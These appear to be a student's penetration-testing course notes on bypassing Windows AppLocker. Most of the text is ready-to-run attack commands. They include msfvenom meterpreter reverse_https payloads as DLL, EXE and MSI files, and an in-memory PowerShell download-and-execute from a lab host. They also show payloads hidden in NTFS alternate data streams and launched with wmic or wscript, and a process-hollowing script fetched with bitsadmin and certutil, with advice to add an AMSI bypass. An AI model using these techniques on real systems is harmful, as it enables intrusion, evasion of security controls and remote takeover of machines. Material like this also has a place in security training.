### **MAIN BYPASS METHODS:**
- Shell:
    1. MSBuild.exe > Hollow.csproj
    2. InstallUtil.exe > In-memory PS load Hollow.dll
- PS Commands (Enumeration):
    1. InstallUtil.exe > In-memory PS download scripts and run
    2. MSBuild.exe > PowerLessShell.py-generated .csproj file w/ PS commands

### Background

    //Software Restriction Policies (SRP) > AppLocker > Windows Defender Application Control (WDAC) / Device Guard
    //AppLocker is only available on Enterprise and Ultimate editions of Windows (not Professional)
    //Rule types: file path, file hash, digital signature
    //Applying rules: Student login (Admins are exempt); as admin cmd: gpedit.msc; Local Group Policy Editor: Local Computer Policy -> Computer Configuration -> Windows Settings -> Security Settings -> Application Control Policies > AppLocker
        **    //Enable policies, then configure rules; To apply:  gpupdate /force
            //Test:  copy C:\Windows\System32\calc.exe calc2.exe; calc2.exe
            //View logs in Event Viewer
            
    *Check for AppLocker rules:  Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
        //*Rules don't apply to built-in local accounts (Local System, Local Service, Network Service) or to IIS DefaultAppPool account
            //only have to worry if you migrate into another user's process

### Basic Bypasses

    https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md

    - Finding Writable/Executable Folders:
        Step 1: find writable (run as admin):  
            accesschk.exe "student" C:\Windows -wus
            accesschk.exe "student" "C:\Program Files" -wus
            accesschk.exe "student" "C:\Program Files (x86)" -wus
        Step 2: check each if executable too:  
            icacls.exe C:\Windows\Tasks
        Candidates:
            C:\Windows\Tasks, C:\Windows\Temp, C:\Windows\tracing, C:\Windows\System32\spool\drivers\color\, etc.    
        *Or:  https://raw.githubusercontent.com/3gstudent/Bypass-Windows-AppLocker/master/AppLockerBypassChecker-v1.ps1
            (new-object system.net.webclient).downloadstring('http://192.168.45.158/AppLockerBypassChecker-v1.ps1') | IEX

    - Bypass with DLLs:   
        //applocker doesn't prevent loading dlls by default
            ex. rundll32 C:\Tools\TestDll.dll,run
        //DLL whitelisting can be present
            **Bypass by copying the dll into C:\Windows\Tasks, etc.
            ex. sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f dll -o /var/www/html/met.dll
                rundll32 C:\Windows\Tasks\met.dll,xyz

    - Bypass with Alternate Data Streams:    
        //ADS Method (if you can edit a file but not write to the directory - and execution is only allowed from that directory):
            sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -a x64 -f exe -o /var/www/html/meterpreter64.exe
            type C:\temp\meterpreter64.exe > "C:\Program Files\Program\log.txt:meterpreter64.exe"
            dir /R "C:\Program Files\Program"
            wmic process call create '"C:\Program Files\Program\log.txt:meterpreter64.exe"'     
        ex. using test.js:
                var shell = new ActiveXObject("WScript.Shell");
                var res = shell.Run("cmd.exe");
            type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
            dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"
            wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"      

    - ** MSIExec:
        sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -a x64 -f msi -o /var/www/html/powershell.msi
        msiexec /quiet /i cmd.msi
        //remote and renamed:  msiexec /q /i http://192.168.100.3/tmp/cmd.png    

    - 3rd Party Execution: CHECK FOR LANGUAGES LIKE PYTHON INSTALLED - they're not blocked
        ex. sudo msfvenom -p cmd/windows/python/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw

    - APPLOCKER DOESN'T STOP VBA/OFFICE MACROS - try that!

    //**Hollower example with ADS - only working with .js (after converting w/ DotNetToJScript):
        //add amsi bypass to top of script!
        certutil -encode \\192.168.45.188\visualstudio\DotNetToJScript-master\DotNetToJScript\bin\Release\Hollow.js \\192.168.45.188\visualstudio\file.txt
        bitsadmin /Transfer myJob http://192.168.45.188/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:Hollow.js" && del C:\users\student\enc.txt
        wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:Hollow.js" 